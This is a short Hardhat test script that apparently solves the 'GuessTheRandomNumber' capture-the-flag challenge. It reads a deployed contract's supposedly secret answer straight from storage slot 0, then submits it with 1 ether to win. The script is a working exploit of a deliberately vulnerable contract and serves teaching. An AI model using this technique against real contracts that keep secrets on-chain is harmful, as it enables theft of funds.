const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = "0x27f322Aa5e7768CB0AB8B806d73e710fae4B4871";

before(async () => {
  accounts = await ethers.getSigners();
  eoa = accounts[0];
  const factory = await ethers.getContractFactory(
    "GuessTheRandomNumberChallenge"
  );
  contract = factory.attach(CHALLENGE_ADDRESS);
});

it("GuessTheRandomNumber", async function () {
  const ans = await ethers.provider.getStorageAt(
    "0x27f322Aa5e7768CB0AB8B806d73e710fae4B4871",
    0
  );
  const tx = await contract.guess(ethers.BigNumber.from(ans), {
    value: ethers.utils.parseEther("1.0"),
  });
  await tx.wait();

  var isComplete = await contract.isComplete();
  expect(isComplete).to.be.true;
});
